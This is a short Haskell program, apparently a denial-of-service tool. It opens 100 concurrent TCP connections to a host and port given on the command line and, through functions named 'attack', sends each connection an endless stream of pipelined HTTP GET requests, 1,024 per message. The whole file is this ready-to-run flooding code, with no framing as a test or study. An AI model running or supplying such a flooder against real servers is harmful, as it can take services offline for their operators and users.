{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE Strict #-}
import Network.Socket
import Control.Monad
import qualified Data.ByteString.Char8 as B
import qualified Network.Socket.ByteString as B
import Control.Concurrent
import Foreign.Marshal.Alloc
import GHC.IO.Handle
import System.Environment

nconns :: Int
nconns = 100
  
main = do
  [host, port] <- getArgs
  (addrinfo:_) <- getAddrInfo 
                    (Just (defaultHints { addrFamily = AF_INET
                                        , addrSocketType = Stream })) 
                    (Just host) 
                    (Just port)
  let sa = addrAddress addrinfo
  print sa
  forM_ ([2..nconns]) $ \_ -> forkIO (attack sa)
  attack sa

attack sa = do
  sock <- socket AF_INET Stream 0
  connect sock sa
  attack1 sock

attack1 sock =
  do forkIO $ allocaBytes 1024 
                          (\buf -> 
                             forever $ recvBuf sock buf 1024)
     forever $ B.sendAll sock prepmsg

prepmsg :: B.ByteString
prepmsg = B.concat $ take 1024 $ repeat "GET /robgssp HTTP/1.1\r\n\r\n"
